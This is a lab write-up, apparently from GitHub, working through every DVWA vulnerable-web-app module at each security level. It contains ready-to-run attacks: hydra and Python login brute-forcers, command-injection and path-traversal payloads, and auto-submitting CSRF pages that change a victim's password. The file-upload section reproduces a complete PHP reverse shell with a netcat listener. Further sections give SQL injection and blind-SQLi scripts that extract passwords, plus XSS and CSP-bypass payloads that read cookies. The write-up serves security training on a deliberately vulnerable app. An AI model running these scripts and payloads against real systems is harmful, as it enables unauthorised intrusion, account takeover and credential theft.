## DVWA Writeups



- [Brute Force](#brute-force)

- [Command Injection](#command-injection)

- [Cross Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)

- [File Inclusion](#file-inclusion)

- [File Upload](#file-upload)

- [SQL Injection](#sql-injection)

- [SQL Injection (Blind)](#sql-injection-blind)

- [Weak Session IDs](#weak-session-ids)

- [DOM Based Cross Site Scripting (XSS)](#dom-based-cross-site-scripting-xss)

- [Reflected Cross Site Scripting (XSS)](#reflected-cross-site-scripting-xss)

- [Stored Cross Site Scripting (XSS)](#stored-cross-site-scripting-xss)

- [Content Security Policy (CSP) Bypass](#content-security-policy-csp-bypass)

- [JavaScript Attacks](#javascript-attacks)


---


### Brute Force


The goal is to brute force an HTTP login page.

**Security level is currently: low.**

On submitting the username and password we see that it is using get request 

<img width="477" alt="image" src="https://user-images.githubusercontent.com/79740895/185153021-af373095-102b-4d68-88c7-573499351bc5.png">

So let’s use hydra for brute force:

``` 
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
```

Here we are using cookies because if we are not authenticated when we make the login attempts, we will be redirected to default login page.

<!-- {::options parse_block_html="true" /}  -->

<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
  
```Shell
┌─[aftab@parrot]─[~/Downloads/dvwa]
└──╼ $hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-17 23:50:56
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get-form://127.0.0.1:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346
[80][http-get-form] host: 127.0.0.1   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-17 23:51:59

```
  
</details>

<!-- {::options parse_block_html="false" /} -->

Login credentials found by hydra:
`admin:password`

<br/>

**Security level is currently: medium.**


It is still using get request.

so lets use hydra again:
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://127.0.0.1/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: PHPSESSID=j422143437vlsdgqs0t1385420; security=medium'
```
it still work but this time attack takes significantly longer then before.

on analyzing the login functionality we notice that the response is delayed by 2 or 3 seconds on wrong attempt.

<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
  
```Shell
┌─[aftab@parrot]─[~/Downloads/dvwa]
└──╼ $hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://127.0.0.1/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: PHPSESSID=j422143437vlsdgqs0t1385420; security=medium'
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-18 09:17:45
[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get-form://127.0.0.1:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: PHPSESSID=j422143437vlsdgqs0t1385420; security=medium
[80][http-get-form] host: 127.0.0.1   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-18 09:18:50

```
  
</details>

<br/>

**Security level is currently: high.**

It's still get request but this time one additional parameter `user_token`

It's using CSRF token so hydra wont help, let's use python this time.

<details><summary markdown="span">Click to see python code :diamond_shape_with_a_dot_inside: </summary>
  
```python
import requests
from bs4 import BeautifulSoup
from requests.structures import CaseInsensitiveDict

url = 'http://127.0.0.1/vulnerabilities/brute/'

headers = CaseInsensitiveDict()
headers["Cookie"] = "security=high; PHPSESSID=j422143437vlsdgqs0t1385420"

r = requests.get(url, headers=headers)

r1 = r.content
soup = BeautifulSoup(r1, 'html.parser')
user_token = soup.findAll('input', attrs={'name': 'user_token'})[0]['value']
  
with open("/usr/share/wordlists/rockyou.txt", 'rb') as f:
    for i in f.readlines():
        i = i[:-1]
        try:
            a1 = i.decode()
        except UnicodeDecodeError:
            print(f'can`t decode {i}')
            continue

        r = requests.get(
            f'http://127.0.0.1/vulnerabilities/brute/?username=admin&password={a1}&Login=Login&user_token={user_token}#',
            headers=headers)
        r1 = r.content
        soup1 = BeautifulSoup(r1, 'html.parser')
        user_token = soup1.findAll('input', attrs={'name': 'user_token'})[0]['value']
        print(f'checking {a1}')
        if 'Welcome' in r.text:
            print(f'LoggedIn: username: admin , password:{a1}   ===found===')
            break
```
  
</details>

<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
  
```Shell
┌─[aftab@parrot]─[~/Downloads/dvwa]
└──╼ $python brute_high.py 
checking 123456
checking 12345
checking 123456789
checking password
LoggedIn: username: admin , password:password   ===found===
```
  
</details>

<br/>

---

### Command Injection

<img width="467" alt="image" src="https://user-images.githubusercontent.com/79740895/185295923-7a149c9d-8f1e-4262-ae0a-3884514462ac.png">

we are given with functionality to ping device. we give ip or domain to ping:

input: localhost

output:

<img width="463" alt="image" src="https://user-images.githubusercontent.com/79740895/185296846-d2795040-d782-4d85-af22-5197875b0f91.png">

This is about command injection so backend must be appending our input ping command.

we can give our arbitrary command to execute with the help of pipe `|` ,so let's create a simple payload :
```
|ls
```

<img width="467" alt="image" src="https://user-images.githubusercontent.com/79740895/185297755-e48d1fc7-cccd-4a81-acf3-3558ffb70366.png">

_it works on all low, medium and high_

<br/>

---

### Cross Site Request Forgery (CSRF)

**Security level is currently: low.**

<img width="827" alt="image" src="https://user-images.githubusercontent.com/79740895/185393318-096ce7f2-f881-4aee-ba63-1a6c2074fb52.png">

Here we can change password, there is no csrf protection. We can create simple form to auto submit and change password of victim.

<details><summary markdown="span">Click to see html code for CSRF :diamond_shape_with_a_dot_inside: </summary>
  
```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.170.131/vulnerabilities/csrf/">
      <input type="hidden" name="password&#95;new" value="pass" />
      <input type="hidden" name="password&#95;conf" value="pass" />
      <input type="hidden" name="Change" value="Change" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
  
</details>

we can host this page so when victim visit page their password will automatically change.

I'm using python to host webpage:

<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
  
```Shell
C:\Users\AFTAB SAMA\Downloads>python -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:192.168.173.222 - - [18/Aug/2022 18:03:11] "GET /csrf-test.html HTTP/1.1" 200 -
::ffff:192.168.173.222 - - [18/Aug/2022 18:03:12] code 404, message File not found
::ffff:192.168.173.222 - - [18/Aug/2022 18:03:12] "GET /favicon.ico HTTP/1.1" 404 -
```

</details>



**Security level is currently: medium.**

Same attack won't work, looking at sourcecode we know that server checks where the request came from.

<img width="333" alt="image" src="https://user-images.githubusercontent.com/79740895/185403021-db671fc3-c08d-47e2-8a8f-fdb639e50e90.png">

one way to get around is if we can upload our file in server.

Now first of all change csrf.html into csrf.php file, then set low security level and switch into file uploading vulnerability inside DVWA.

Here the above text file of html form is now saved as csrf.php is successfully uploaded in the server which you can see from given screenshot.

<img width="468" alt="image" src="https://user-images.githubusercontent.com/79740895/185402657-d1e47dc3-2884-4619-a5a6-5dafbe459a68.png">

now we can use this new url: `http://192.168.170.131/hackable/uploads/csrf.php`

password changed.



**Security level is currently: high.**

This time it use csrf token. we can read this token if we have same origin and we can do that by uploading our payload to server as shown previously.

upload this code to server:

<details><summary markdown="span">Click to see code :diamond_shape_with_a_dot_inside: </summary>
  
```html
<html>
 <body>
  <p>TOTALLY LEGITIMATE AND SAFE WEBSITE </p>
  <iframe id="myFrame" src="http://192.168.170.131/vulnerabilities/csrf" style="visibility: hidden;" onload="maliciousPayload()"></iframe>
  <script>
   function maliciousPayload() {
    console.log("start");
    var iframe = document.getElementById("myFrame");
    var doc = iframe.contentDocument  || iframe.contentWindow.document;
    var token = doc.getElementsByName("user_token")[0].value;
const http = new XMLHttpRequest();
    const url = "http://192.168.170.131/vulnerabilities/csrf/?password_new=hackerman&password_conf=hackerman&Change=Change&user_token="+token+"#";
    http.open("GET", url);
    http.send();
    console.log("password changed");
   }
  </script>
 </body>
</html>
```

</details>

on visiting this url it will read token from DOM and create password change request to server.

<img width="478" alt="image" src="https://user-images.githubusercontent.com/79740895/185408922-c1d9e774-3e43-4170-bcda-3c0269fc6260.png">

<br/>

---

### File Inclusion

**Security level is currently: low.**

In url there is GET parameter `page` used for including file.

url:`http://192.168.170.131/vulnerabilities/fi/?page=include.php`

By changing this file location we can read file on server.

url:`http://192.168.170.131/vulnerabilities/fi/?page=/etc/passwd`

<img width="658" alt="image" src="https://user-images.githubusercontent.com/79740895/185410392-bf62fdae-c6c7-4f90-a934-191ffadcf471.png">


_Also work for medium_

**Security level is currently: high.**

we have one condition that file name should start with `file`.

<img width="343" alt="image" src="https://user-images.githubusercontent.com/79740895/185414371-f1a0cb44-0688-40ab-ae49-1c623e19744f.png">

we can bypass that with payload:`file/../../../../../../etc/passwd` path traversal.

<img width="456" alt="image" src="https://user-images.githubusercontent.com/79740895/185414731-fda51955-9d13-4b60-893a-f700f29021eb.png">

<br/>

---

### File Upload

**Security level is currently: low.**

php reverse shell code:

<details><summary markdown="span">Click to see code :diamond_shape_with_a_dot_inside: </summary>
  
```php
<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = 'bash';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");
                    do {
						$status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('192.168.170.131', 9001);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
```

</details>

Listing IP: `192.168.170.131` port: `9001`

netcat listener command: `nc -lvnp 9001`

upload the file `rev.php` and visit the url : `http://192.168.170.131/hackable/uploads/rev.php`

and you have reverse shell:

<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
  
```Shell
┌─[✗]─[aftab@parrot]─[~/Downloads/dvwa]
└──╼ $nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.170.131] from (UNKNOWN) [172.17.0.2] 54022
SOCKET: Shell has connected! PID: 331
whoami
www-data
uname
Linux
```

</details>



**Security level is currently: medium.**

This time it is blocking php file we can bypass that by changing:

`Content-Type: application/x-php`  ==>   `Content-Type: image/png`

we can also do that from browser go to inspect element ,Network tab resubmit the request so it show up on network tab select that upload request right click and Edit and Resend:

<img width="407" alt="image" src="https://user-images.githubusercontent.com/79740895/185420346-ab0c9387-7cc6-4402-9376-b3611f35df46.png">

make changes and hit send button,visit the url and you have reverse shell.



**Security level is currently: high.**


Changing Content-Type is not working maybe server is verifying the file header signature.

add `GIF98;` at the start of our exploit file and rename it with `rev.php.jpg`.

but whene we visit it directly it is not working so we use file inclusion:

url: `http://192.168.170.131/vulnerabilities/fi/?page=file/../../../hackable/uploads/rev.php.jpg`     <- security high

and we have reverse shell on our netcat listener.

<br/>

---

### SQL Injection


**Security level is currently: low.**

We can detect SQL injection with `'` on submiting this we get SQL error.

we can see all entries with `' or 1=1#` :

<img width="248" alt="image" src="https://user-images.githubusercontent.com/79740895/185461785-b0426c0a-db1c-4118-b654-fe62a8b607c9.png">

We can extract all passwords with payload:

```' UNION SELECT user, password FROM users#```

<img width="271" alt="image" src="https://user-images.githubusercontent.com/79740895/185463551-74dfcac3-bed2-44b5-9fd8-4bf6bcc78e2b.png">


**Security level is currently: medium.**

It's using POST parameter and quotes are filtered, but ID value is directly added to the query so we dont even need quotes 

payload: `1 or 1=1 UNION SELECT user, password FROM users#`

<img width="326" alt="image" src="https://user-images.githubusercontent.com/79740895/185467076-707fd767-e575-42d1-9b86-5a16937f133d.png">

**Security level is currently: high.**

payload from low security also works here

Payload: `' UNION SELECT user, password FROM users#`

<img width="281" alt="image" src="https://user-images.githubusercontent.com/79740895/185468611-17e12bd2-8513-4844-beac-b0d8d9c27725.png">

<br/>

---

### SQL Injection (Blind)


**Security level is currently: low.**

Payload to detect vulnerability: `1' and sleep(5)#` it is taking 5 to response.

Python code to brute force version:

<details><summary markdown="span">Click to see code :diamond_shape_with_a_dot_inside: </summary>
  
```python
import requests
from requests.structures import CaseInsensitiveDict

headers = CaseInsensitiveDict()
headers["Cookie"] = "security=low; PHPSESSID=to84ds41bhba7ub48s10a8qim0"
url = 'http://192.168.170.131/vulnerabilities/sqli_blind/'

for i in range(100):
    parameters = f"id=1'+and+length(version())%3d{i}%23&Submit=Submit"
    r = requests.get(url, headers=headers, params=parameters)
    if 'User ID exists in the database' in r.text:
        print(f'length = {i}')
        length = i
        break
j = 1
for i in range(1, length+1):
    for s in range(30, 126):
        parameters = f"id=1'+and+ascii(substring(version(),{i},{j}))%3d{s}%23&Submit=Submit"
        r = requests.get(url, headers=headers, params=parameters)
        if 'User ID exists in the database' in r.text:
            print(chr(s), end='')
            break
        j += 1

```

</details>


<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
  
```Shell
length = 24
10.1.26-MariaDB-0+deb9u1
Process finished with exit code 0
```

</details>



**Security level is currently: medium.**

Payload to detect vulnerability: `1 and sleep(5)` it is taking 5 to response.


Python code to brute force version:


<details><summary markdown="span">Click to see code :diamond_shape_with_a_dot_inside: </summary>
  
```python
import requests
from requests.structures import CaseInsensitiveDict

headers = CaseInsensitiveDict()
headers["Cookie"] = "security=medium; PHPSESSID=to84ds41bhba7ub48s10a8qim0"
headers["Content-Type"] = "application/x-www-form-urlencoded"
url = 'http://192.168.170.131/vulnerabilities/sqli_blind/'

for i in range(100):
    parameters = f"id=1+and+length(version())={i}&Submit=Submit"
    # parameters = {"id": f'1+and+length(version())={i}', "Submit": "Submit"}
    r = requests.post(url, headers=headers, data=parameters)
    if 'User ID exists in the database' in r.text:
        print(f'length = {i}')
        length = i
        break
j = 1
for i in range(1, length+1):
    for s in range(30, 126):
        parameters = f"id=1+and+ascii(substring(version(),{i},{j}))={s}&Submit=Submit"
        r = requests.post(url, headers=headers, data=parameters)
        if 'User ID exists in the database' in r.text:
            print(chr(s), end='')
            break
        j += 1

```

</details>


<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
  
```shell
length = 24
10.1.26-MariaDB-0+deb9u1
Process finished with exit code 0
```

</details>


**Security level is currently: high.**

Payload to detect vulnerability: `1' and sleep(5)#` it is taking 5 to response.


Python code to brute force version:


<details><summary markdown="span">Click to see code :diamond_shape_with_a_dot_inside: </summary>
  
```python
import requests
from requests.structures import CaseInsensitiveDict

headers = CaseInsensitiveDict()
headers["Cookie"] = "id=1%27+and+length%28version%28%29%29%3E0%23; security=high; PHPSESSID=to84ds41bhba7ub48s10a8qim0"
url = 'http://192.168.170.131/vulnerabilities/sqli_blind/'

for i in range(100):
    headers["Cookie"] = f"id=1'+and+length(version())%3d{i}%23; security=high; PHPSESSID=to84ds41bhba7ub48s10a8qim0"
    r = requests.get(url, headers=headers)
    if 'User ID exists in the database' in r.text:
        print(f'length = {i}')
        length = i
        break
j = 1
for i in range(1, length+1):
    for s in range(30, 126):
        headers["Cookie"] = f"id=1'+and+ascii(substring(version(),{i},{j}))%3d{s}%23; security=high; PHPSESSID=to84ds41bhba7ub48s10a8qim0"
        r = requests.get(url, headers=headers)
        if 'User ID exists in the database' in r.text:
            print(chr(s), end='')
            break
        j += 1

```

</details>


<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
  
```shell
length = 24
10.1.26-MariaDB-0+deb9u1
Process finished with exit code 0
```

</details>

<br/>

---

### Weak Session IDs


**Security level is currently: low.**

cookie value is easily predictable it's initially 0 and increment by 1 on regenerate.

**Security level is currently: medium.**

cookie value is set using time(); method.

**Security level is currently: high.**

It's is similar to low level but it is doing md5 hash of that additionally.


<br/>

---

### DOM Based Cross Site Scripting (XSS)


**Security level is currently: low.**


We have option to select language and value is reflected in GET parameter default=English

payload=`<script>alert(document.cookie);</script>`  

using this it will trigger an alert pop up with cookie values.


**Security level is currently: medium.**

we are stuck inside option tag so we have escape that and we can't use script tag because that is blocked so we use image tag.

payload=`" ></option></select><img src=x onerror="alert(document.cookie)">`


**Security level is currently: high.**

This time server is using whitelist we can bypass that by puting our payload after `#` because anything after `#` is not sent to 
server but still reflecting on the page.

payload=`#<script>alert(document.cookie);</script>`


<br/>

---

### Reflected Cross Site Scripting (XSS)


**Security level is currently: low.**

we have name field which is reflecting on page.

payload=`<img src=x onerror="alert(document.cookie)">`

It triggers an alert pop up with cookie value.


**Security level is currently: medium.**

_payload of low level also works here: _

payload=`<img src=x onerror="alert(document.cookie)">`


**Security level is currently: high.**

_payload of low level also works here: _

payload=`<img src=x onerror="alert(document.cookie)">`


---

### Stored Cross Site Scripting (XSS)


**Security level is currently: low.**

we have name and message field let's put our payload in message:

payload=`<img src=x onerror="alert(document.cookie)">`

and it's working it will trigger an alert pop up with cookie value.


**Security level is currently: medium.**

This time we put our paylod in name field we can easily bypass the maximum character limit by changing the maxlength attribute of input from DevTools.
we change the case of our payload:

payload=`<sCrIpT>alert(document.cookie);</ScRiPt>`

It will successfully trigger alert pop up with cookie value.


**Security level is currently: high.**

this time script tag is entirely blocked so we use different payload method same as we used in medium.

payload=`<ImG src=x onerror="alert(document.cookie)">`


<br/>

---

### Content Security Policy (CSP) Bypass



**Security level is currently: low.**

from CSP we can import script from pastebin.com, so let's put our script on pastebin and include that link:

payload=`https://pastebin.com/dl/Lnamji4V`

this JavaScript is executed on page.


**Security level is currently: medium.**

It's using nonce to prevent execution of JavaScript includ but this value is static so we can add this to our payload:

nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=

payload=`<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(document.cookie)</script>`

**Security level is currently: high.**

It is making request to `http://192.168.170.131/vulnerabilities/csp/source/jsonp.php?callback=solveSum` to solve this lab we have to intercept this request
and anything we set to callback's value wil be executed so we can modify it to `callback=alert(document.cookie);`  and alert will pop up.


<br/>

---

### JavaScript Attacks


**Security level is currently: low.**

Submit the word "success" to win. 

we have phrase=ChangeMe and we have to change it to "success".
there is token and the value of token is md5(rot13(phrase).

rot13("success")  =  "fhpprff"

md5("fhpprff")  =  "38581812b435834ebf84ebcc2c6424d6"

so value of token and phrase:

`token=38581812b435834ebf84ebcc2c6424d6&phrase=success`

let's submit this:

<img width="296" alt="image" src="https://user-images.githubusercontent.com/79740895/185639989-2de75e85-045f-4805-902b-b3ce417e88d2.png">


**Security level is currently: medium.**

The value of token for phrase=ChangeMe is: `token=XXeMegnahCXX`

if we look closely we can see that the value is "XX" + reverse of phrase + "XX"

so new value for "sseccus" will be "XXsseccusXX"

`token=XXsseccusXX&phrase=success`

<img width="333" alt="image" src="https://user-images.githubusercontent.com/79740895/185643241-ae14fb37-4cf9-42bd-a227-c52d2e3e98d1.png">


**Security level is currently: high.**


JavaScript is performing following 3 steps to generate token:

1. reverse the value of phrase:

	phrase=success

	token=sseccus

2. prepend 'XX' at start and sha256:

	token = 'XX' + token = 'XXsseccus'

	sha256(token) = sha256("XXsseccus") = "7f1bfaaf829f785ba5801d5bf68c1ecaf95ce04545462c8b8f311dfc9014068a"

3. append 'ZZ' and sha256:

	token = token + 'ZZ' = "7f1bfaaf829f785ba5801d5bf68c1ecaf95ce04545462c8b8f311dfc9014068aZZ"

	sha256(token) = sha256("7f1bfaaf829f785ba5801d5bf68c1ecaf95ce04545462c8b8f311dfc9014068aZZ") = 
"ec7ef8687050b6fe803867ea696734c67b541dfafb286a0b1239f42ac5b0aa84"

	`token=ec7ef8687050b6fe803867ea696734c67b541dfafb286a0b1239f42ac5b0aa84&phrase=success`

	let's submit this:

	<img width="365" alt="image" src="https://user-images.githubusercontent.com/79740895/185679989-4835924d-d5ee-4cff-8733-dcba97291dfa.png">

<br/>


:octocat: Happy Hacking :octocat:
